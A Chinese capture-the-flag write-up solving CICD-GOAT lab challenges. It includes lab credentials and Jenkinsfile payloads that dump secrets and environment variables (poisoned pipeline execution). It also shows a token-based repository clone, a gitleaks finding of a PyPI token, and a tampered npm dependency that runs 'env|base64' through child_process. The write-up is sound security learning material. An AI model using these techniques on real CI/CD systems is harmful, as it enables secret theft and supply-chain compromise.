# CICD-GOAT

```
- Jenkins：http://localhost:8080
- Username: alice
- Password: alice
- Gitea：http://localhost:3000
- Username: thealice
- Password: thealice

如果你想仔细查看管理员是如何配置的环境，可以使用如下凭据登录后台：
- CTFd
- Username: admin
- Password: ciderland5#
- Jenkins
- Username: admin
- Password: ciderland5#
- Gitea
- Username: red_queen
- Password: ciderland5#
```

## White Rabbit

考察的是PPE漏洞。访问项目对应的gitea仓库，发现存在Jenkinsfile文件，git clone下来注入恶意代码：

```json
pipeline {
    agent any
    environment {
        PROJECT = "src/urllib3"
    }

    stages {
stage('getflag') {
            steps {
                withCredentials([string(credentialsId: 'flag1', variable: 'flag1')]) {
                        sh '''
                            echo "flag1:".$flag1|base64
                        '''
                }
            }
        }
        stage ('Install_Requirements') {
            steps {
                sh """
                    virtualenv venv
                    pip3 install -r requirements.txt || true
                """
            }
        }

        stage ('Lint') {
            steps {
                sh "pylint ${PROJECT} || true"
            }
        }

        stage ('Unit Tests') {
            steps {
                sh "pytest"
            }
        }

    }
    post {
        always {
            cleanWs()
        }
    }
}
```

创建新分支推送到仓库中并pr：

```bash
git checkout -b challenge1
git add *
git commit -m "commit"
git push -u origin challenge1
```

![image-20231106132834554](README.assets/image-20231106132834554.png)

之后去jenkins中找到pipeline的构建过程，获得flag：

![image-20231106133921374](README.assets/image-20231106133921374.png)

## Mad Hatter

Mad Hatter分成了两个仓库，一个仓库存代码一个仓库存pipeline配置文件，切pipeline配置文件的那个仓库无法git push，因此考察的就是间接PPE了。

```bash
 ! [remote rejected] challenge2 -> challenge2 (pre-receive hook declined)
```

修改makefile：

```
whoami:
	echo $FLAG|base64
```

然后就是之前的步骤：

![image-20231106140123401](README.assets/image-20231106140123401.png)

但是我这边有问题一直会报错：

```bash
+ virtualenv venv
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
Segmentation fault
```

但是思路是没问题的



## Duchess

描述中存储库中存在PyPi token，因此其实就是存储库代码的信息收集了。拿gitleak：

```bash
gitleaks detect  -v
Finding:     password = pypi-AgEIcHlwaS5vcmcCJGNmNTI5MjkyLWYxYWMtNDEwYS04OTBjLWE4YzNjNGY1ZTBiZAACJXsicGVybWlzc2lvbnMiOiAidXN...Y
Secret:      pypi-AgEIcHlwaS5vcmcCJGNmNTI5MjkyLWYxYWMtNDEwYS04OTBjLWE4YzNjNGY1ZTBiZAACJXsicGVybWlzc2lvbnMiOiAidXN...
RuleID:      pypi-upload-token
Entropy:     5.538379
File:        .pypirc
Line:        8
Commit:      43f216c2268a94ff03e5400cd4ca7a11243821b0
Author:      Asaf
Email:       asaf@cidersecurity.io
Date:        2021-11-16T09:22:31Z
Fingerprint: 43f216c2268a94ff03e5400cd4ca7a11243821b0:.pypirc:pypi-upload-token:8
```





## Caterpillar

这道题比较的奇怪，直接从结果来先分析一下。

jenkins上有两个Caterpillar的job，一个是test一个是prod。先看一下test的配置：

![image-20231106162609205](README.assets/image-20231106162609205.png)

test是如果发现了forks的项目发起了对main的pull requests就会触发pipeline且trust everyone，因此这就相当于是public-ppe。

而prod的配置：

![image-20231106162754697](README.assets/image-20231106162754697.png)

策略官方文档是这样写的：

- **Exclude branches that are also filed as PRs**. The source branch is not scanned such as the origin’s master branch. These branches need to be merged.
- **Only branches that are also filed as PRs**. Only scan the PR branch.

newbing说第一个是不包含pr了的分支，第二个是pr了的分支。

因此把项目fork下来，git clone之后修改pipeline配置文件读取env：

```json
pipeline {
    agent any
    environment {
        PROJECT = "loguru"
    }

    stages {
        stage ('Install_Requirements') {
            steps {
                sh """
                    env
                """
            }
        }

    }

    post {
        always {
            cleanWs()
        }
    }
}
```

然后老步骤push上去并pull request。

可以读取到env：

![image-20231106160657707](README.assets/image-20231106160657707.png)

该令牌具有存储库的可写权限，使用此令牌clone存储库：

```bash
git clone http://5d3ed5564341d5060c8524c41fe03507e296ca46@127.0.0.1:3000/Wonderland/caterpillar.git
```

然后就是修改成读取flag的pipeline：

```json
stage('deploy') {
    steps {
        withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'flag2', passwordVariable: 'TOKEN')]) {
            sh 'echo $TOKEN | base64'
        }
    }
}
```

然后push过去就可以执行（我这边直接用main分支就可以了，我看有的wp用的自己的branch，但是我这边似乎有问题，检测不到新branch）

（重启完就好了。。。）

## Cheshire Cat

题目中说All jobs in your victim’s Jenkins instance run on dedicated nodes, but that’s not good enough for you.因此暗示了可能要指定node来执行。考虑到一般是在agent1，因此应该制定在built-in node上执行。

git clone下来之后修改`Jenkinsfile`：

```json
pipeline {
    agent {label 'built-in'}
    environment {
        PROJECT = "sanic"
    }

    stages {

        stage ('Unit Tests') {
            steps {
                sh "cat ~/flag5.txt|base64"
            }
        }
    }

    post {
        always {
            cleanWs()
        }
    }
}
```

指定agent是`built-in`且从文件系统中读取flag。

然后同样的流程直到pull request，获得flag：

![image-20231106181122412](README.assets/image-20231106181122412.png)

## Twiddledum

目标是一个文件夹，gitea上有两个仓库，一个是twiddledee一个是twiddledum，尝试在jenkins里面构建twiddledum，发现pipeline中执行了node index.js，index.js中require了twiddledee，而且twiddledum不可控，而twiddledee可控，因此往twiddledee中注入恶意代码。

修改twiddledee的index.js：

```js
const child_process = require('child_process');
child_process.exec('env|base64 -w 0',function(error, stdout, stderr){console.log(stdout)});
```

直接push到main分支上。

根据twiddledum的package.json：

```json
  "dependencies": {
    "twiddledee": "git+http://gitea:3000/Wonderland/twiddledee#semver:^1.1.0"
  },
```

它是通过字下载twiddledee版本发布中的1.1.0来更新的。因此把之前1.1.0的版本发布和tag删除后重新发布：

![image-20231106185115442](README.assets/image-20231106185115442.png)



twiddledum那里再build就可以得到flag：

![image-20231106185538452](README.assets/image-20231106185538452.png)







